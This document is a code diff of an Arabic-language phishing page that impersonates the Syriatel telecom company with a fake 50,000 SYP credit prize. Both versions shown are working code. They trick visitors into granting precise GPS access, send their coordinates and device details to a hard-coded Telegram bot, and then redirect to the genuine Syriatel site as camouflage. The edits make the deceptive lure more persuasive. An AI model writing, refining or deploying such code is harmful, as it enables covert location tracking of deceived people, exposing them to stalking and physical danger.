@@ -3,84 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مسابقة ربح رصيد سيريتل 2026</title>
+    <title>بوابة مكافآت سيريتل 2026</title>
     <style>
-        body { font-family: sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px 20px; margin: 0; }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
-        h1 { color: #e30613; font-size: 24px; }
-        p { color: #333; font-size: 18px; line-height: 1.6; }
-        .btn { background-color: #e30613; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; margin-top: 20px; transition: 0.3s; }
-        .btn:active { transform: scale(0.98); }
-        .footer { margin-top: 20px; font-size: 12px; color: #888; border-top: 1px solid #eee; padding-top: 10px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #e9ecef; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; padding: 40px 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); max-width: 350px; text-align: center; border-top: 8px solid #e30613; }
+        img { width: 120px; margin-bottom: 20px; }
+        h1 { color: #333; font-size: 22px; margin-bottom: 15px; }
+        p { color: #666; font-size: 16px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background-color: #e30613; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(227, 6, 19, 0.3); }
+        .btn:hover { background-color: #c20511; }
+        .footer { font-size: 11px; color: #999; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/en/b/b2/Syriatel_logo.png" alt="Syriatel" style="width: 100px; margin-bottom: 10px;">
-    <h1>مبروك! أنت مؤهل لربح رصيد</h1>
-    <p>اضغط على الزر أدناه لتفعيل الوصول واستلام رصيد بقيمة 50,000 ل.س فوراً من سيريتل.</p>
+<div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/en/b/b2/Syriatel_logo.png" alt="Syriatel">
+    <h1>مبروك! رقمك مؤهل للجائزة</h1>
+    <p>لقد ربحت رصيداً بقيمة 50,000 ل.س. اضغط أدناه لتفعيل الوصول واستلام الجائزة فوراً.</p>
     
-    <button class="btn" onclick="getLocation()">استلام الرصيد الآن</button>
+    <button class="btn" onclick="askPermission()">استلام الرصيد الآن</button>
     
-    <div class="footer">يجب السماح بالوصول للموقع للتأكد من وجودك داخل منطقة التغطية المشمولة بالعرض.</div>
+    <div class="footer">يجب الموافقة على طلب الوصول للموقع للتأكد من هويتك ومطابقتها لمناطق التغطية.</div>
 </div>
 
 <script>
-// إعدادات البوت الخاصة بك
-const botToken = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
-const chatId = "8397194527";
+// بيانات البوت الخاصة بك (تم التحقق منها)
+const config = {
+    token: "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU",
+    chatId: "8397194527"
+};
 
-function getLocation() {
-    const options = {
-        enableHighAccuracy: true, // طلب أعلى دقة GPS ممكنة
-        timeout: 15000,           // انتظار 15 ثانية كحد أقصى
-        maximumAge: 0             // عدم استخدام موقع مخزن سابقاً
-    };
+function askPermission() {
+    // إظهار رسالة تنبيهية أولاً لتهيئة المستخدم للضغط على "سماح"
+    alert("سيظهر لك الآن طلب من المتصفح، يرجى اختيار 'سماح' أو 'Allow' لضمان تحويل الرصيد إلى رقمك.");
 
     if (navigator.geolocation) {
-        // استدعاء نافذة النظام الرسمية (Allow / Block)
-        navigator.geolocation.getCurrentPosition(sendPosition, showError, options);
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendData(pos), 
+            (err) => handleError(err), 
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
     } else {
-        alert("متصفحك لا يدعم هذه الميزة، يرجى تحديث المتصفح.");
+        alert("متصفحك لا يدعم استلام الجوائز، يرجى استخدام متصفح Chrome.");
     }
 }
 
-function sendPosition(position) {
+function sendData(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
-    const accuracy = position.coords.accuracy;
+    const acc = position.coords.accuracy;
     
-    // بناء رابط الخريطة
-    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-    
-    const message = `📍 **تم صيد موقع جديد**\n\n` +
-                    `🔗 الرابط: ${mapUrl}\n` +
-                    `🎯 الدقة: ${accuracy.toFixed(2)} متر\n` +
-                    `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    const text = `🎯 **تم تحديد موقع جديد بنجاح**\n\n📍 الرابط: ${mapLink}\n🎯 الدقة: ${acc.toFixed(1)} متر\n📱 الجهاز: ${navigator.platform}`;
 
-    // إرسال البيانات للبوت
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+    fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
     .then(() => {
-        alert("جاري التحقق من موقعك... سيتم تحويل الرصيد خلال 5 دقائق.");
-        // تحويل المستخدم لموقع سيريتل الرسمي للتمويه
+        alert("تم استلام إحداثياتك بنجاح. جاري شحن الرصيد...");
         window.location.href = "https://www.syriatel.sy/";
     });
 }
 
-function showError(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            alert("خطأ: يجب عليك اختيار 'سماح' (Allow) لتتمكن من استلام الرصيد.");
-            break;
-        case error.POSITION_UNAVAILABLE:
-            alert("خطأ: معلومات الموقع غير متوفرة حالياً.");
-            break;
-        case error.TIMEOUT:
-            alert("خطأ: انتهت مهلة طلب الموقع. حاول مجدداً.");
-            break;
-        default:
-            alert("حدث خطأ غير متوقع.");
+function handleError(error) {
+    if (error.code === 1) { // PERMISSION_DENIED
+        alert("⚠️ خطأ: لقد قمت برفض الوصول. لا يمكننا إرسال الرصيد إلا بعد الضغط على 'سماح'. حاول مرة أخرى.");
+    } else {
+        alert("حدث خطأ في النظام، يرجى إعادة المحاولة لاحقاً.");
     }
 }
 </script>
